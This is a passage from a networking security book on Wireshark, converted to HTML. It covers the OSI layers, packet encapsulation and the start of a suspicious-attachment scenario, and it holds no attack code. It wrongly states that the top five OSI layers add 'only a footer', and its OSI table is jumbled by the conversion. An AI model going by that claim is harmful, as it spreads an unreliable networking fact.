<div class="Section93" ><p class=17  style="margin-top:3.7500pt;margin-right:14.7500pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l6 level1 lfo2;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Build another VM using another Linux distro or Windows installation but with different settings. Experiment with the options regarding the drive size, drive capacity, or memory settings. Experiment with the ability to copy/paste information directly between host and guest operating systems or to mount</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >the USB.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:23.7000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l6 level1 lfo2;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Explore a different virtualization platform, such as VMware. Currently VMware Workstation Player is free and allows you to host any Windows or Linux guest operating system. The application is available at</span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="http://www.vmware.com/go/tryplayer" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >www.vmware.com/go/tryplayer</span></u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);letter-spacing:-5.6500pt;font-size:12.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >or search for VMWare Workstation</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Player.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section94" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p><h1><a name="Chapter 3: The Fundamentals" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><a name="_bookmark197" ></a><a name="_bookmark198" ></a>Chapter 3</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoNormal  style="margin-top:0.3500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:24.5000pt;" >The Fundamentals</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></p><p class=MsoBodyText  style="margin-top:15.5500pt;" ><a name="_bookmark199" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >It&#8217;s a sure bet that readers will come from a variety of backgrounds, possess varied skill sets, and approach Wireshark with a range of expectations. So, there are fundamentals to solidify before moving on. This chapter aims to both refresh memories and deliver new material (while acknowledging that readers will have different ideas of what needs refreshing and what might be new).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We highlight some key areas and assume that you will delve deeper into a topic if you wish to do so. There are three main areas where people&#8217;s experience and expectations likely differ:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:374.3000pt;margin-left:30.5000pt;line-height:145%;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.6667px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker112854.png" ></span><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:64.9167px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker112855.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Networking Security</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:11.1667px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker112876.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Packet and protocol analysis</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:7.7000pt;margin-right:33.9000pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Each subject is chosen in anticipation of exercises in the upcoming chapters. We cover basic concepts and, where possible, apply</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >those concepts toward the other</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >two.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Note that some of the things covered may be considered too basic by some readers. It is our hope, however, that as you read you will discover some new and helpful concepts. The goal is to ensure that all readers have a common understanding of these fundamentals and can make the most of using Wireshark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="_bookmark200" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Networking" ></a>Networking</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><a name="_bookmark201" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Without networking, there will be no packets to capture from the box you&#8217;re sitting in front of now. It&#8217;s essential we&#8217;re on the same page about how information flows from one device to another, and nothing summarizes it better than working through the OSI model.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section95" ><h2 style="margin-top:3.7000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >OSI Layers</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:7.4000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Yes, it wouldn&#8217;t be a networking discussion without mentioning the OSI model and the layers therein. It&#8217;s assumed you have all seen the following group of layers: the Open Systems Interconnection reference model, or OSI model. Each layer of one system talks to the corresponding layer of the other system. See the following list for the familiar breakdown of the seven OSI layers. A few words are included to remind you what each layer handles.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:7.5000pt;margin-right:0.0000pt;margin-left:30.5000pt;text-indent:0.0000pt;text-align:left;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >SYSTEM 1 </span></b><span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8592; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8211;&#8211;&#8211;&#8211;&#8211;&#8211;&#8211;&#8211;&#8211;&#8211;&#8211; </span><span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8594; </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >SYSTEM 2</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p><p class=MsoBodyText  style="margin-top:7.4500pt;margin-right:11.1500pt;margin-left:30.5000pt;line-height:142%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Application </span><span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8592; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >specific service or application </span><span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8594; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Application Presentation </span><span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8592; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >how the service is formatted </span><span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8594; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Presentation Session </span><span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8592; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >rules how systems talk to one another </span><span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8594; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Session Transport </span><span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8592; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >segment reliability, error checking </span><span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8594; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Transport Network </span><span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8592; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >packets / datagram routing </span><span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8594; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Network</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-right:11.1500pt;margin-left:30.5000pt;line-height:142%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Data Link </span><span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8592; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >structure of data to/from physical </span><span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8594; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Data Link Physical </span><span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8592; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >tangible electrical, light or RF </span><span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8594; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Physical</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-right:13.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When you are working with Wireshark, the layers are directly apparent in the Packet Details pane. In an earlier chapter, we mentioned how the Wireshark GUI is organized. In<a name="_bookmark202" ></a>&nbsp;</span><span><a href="#_bookmark204" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-1</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, we show just the top two GUI panes, the Packet List pane and the Packet Details pane. Wireshark&#8217;s Packet Details pane shows the packet divided into subtrees. Each subtree represents an OSI layer. If you click and highlight the very top subtree, &#8220;Frame 4,&#8221; then all 314 bytes in the Packet Bytes pane would highlight.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section96" ><p class=MsoBodyText ><img width="780"  height="324"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker115076.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark204" ></a><span><a href="#_bookmark202" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-1:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >OSI layers in Wireshark</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In </span><span><a href="#_bookmark204" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-1</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, the OSI layers begin with the next subtree, &#8220;Ethernet II,&#8221; as the layer 2 frame. The next subtree, &#8220;Internet Protocol Version 4&#8230;,&#8221; is the layer 3 packet. The next subtree, &#8220;Transmission Control Protocol,&#8221; is the layer 4 TCP segment. Finally, at the bottom of the figure, the innermost, highlighted portion is the last subtree showing an application layer protocol, HTTP.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Seeing the packet in Wireshark is a great demonstration of how one layer is sandwiched by another. To be more accurate, only the two bottom layers include both a header and footer. The top five include only a footer. The next section shows an example workflow of how data progresses through these layers.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Get the Picture?</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Bear with me on this example of sending a picture from one system to another.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:13.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Obviously, a picture cannot keep the appearance of a picture across the wire. The information must go through a few stages of abstraction before sending. This is the same requirement for any picture, song, or other </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >application </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >data.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For the data to be understood as a definite &#8220;picture,&#8221; it has to follow some standards or rules. The picture&#8217;s </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >presentation </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is understood by both sending and receiving systems. Maybe the picture needs to be</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section97" ><p class=MsoBodyText  style="margin-top:4.3500pt;margin-right:11.1500pt;line-height:102%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >encrypted, reformatted, or compressed. In any case, it is here where our picture goes through real abstraction and transformation.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.2500pt;margin-right:7.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The picture is ready to send as far as it&#8217;s concerned. However, both systems still need to agree how to communicate. Maybe our two systems agree to speak only when spoken to, or perhaps talk at the same time during their </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >session</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, but here the systems agree our whole picture must be divided into </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >segments </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >of data. More guidelines include how much picture data to send at a time, ensuring each packet will get there (and what to do if not), how quickly to send more or less, and, of course, how to number each </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >segment </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >so that the picture doesn&#8217;t end up resembling a Rorschach test when put back together.</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In all, the real networking starts with these rules on how to </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >transport </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >your</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >picture.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Of course, odds are good your two systems are connected to each other on the same network. They could be on different floors, in different buildings, or in different countries. Because different places have their own </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >networks</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, your data segments become network </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >packets</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Appended to every </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >packet </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is instruction where is it ultimately going, and where it was ultimately from.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:9.3000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >However, the final stop is irrelevant to this last abstraction step.</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.3000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Closer to the real world, there are multiple hops across networks. To prepare network packets <a name="_bookmark205" ></a>for sending requires an important link, the </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >data link</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Regarding the data link layer, additional addressing is needed, relevant only to the next actual hop, from the previous hop. Finally, according to the needs of the </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >physical </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >hardware, your digital information gets readied to be sent into the real world. What used to be packets are now </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >frames</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Those frames are transmitted as pulses of voltage, light, or as radio waves. And, thanks to all the agreed protocols between systems, those pulses will again become the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >picture.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Described above is the tiered series of steps of how data goes through layers of abstraction and encapsulation to get out of the system.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.7500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Example</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A user calls you because she opened a suspicious attachment. (First, thank her for coming forward about that!) She now suspects the PC is</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section98" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >making unauthorized connections, or at least trying, based on screen activity. She watched her network link light, but it doesn&#8217;t &#8220;seem to be super lively.&#8221; Still, she asks if you could confirm her doubts.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You first confirm antivirus is running as well as the Windows Firewall. Nothing caught, but a few minutes spent diagnosing the desktop raise the alarm that, yes, something is indeed trying to connect outside.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >What would convince you whether traffic is or isn&#8217;t getting out? Enter Wireshark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As you know, Wireshark shows what packets are leaving and entering the client. You have an idea of the baseline type of traffic, and perhaps after a long and careful examination, you would hope to find some culprit traffic and insight into what data is being sent. Or at the least the destination information.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >But this isn&#8217;t a question about security best practices. (You are a security professional; we don&#8217;t need to quiz you on that.) This is a question about whether Wireshark can help you and what you should expect to see.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Will Wireshark show you anything? To answer that, consider where Wireshark sits in the stack in the OSI layers. Yes, Wireshark presents its data to you at the application layer. But the data presented originates with the lowest logical layer, the data link layer. From the data link layer, you are seeing the entire frame, starting with the MAC addresses, then all the data encapsulated within.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="280"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker119994.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:5.8000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You decide to install Wireshark on the suspect machine. After Wireshark has been running for any considerable time, you might</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
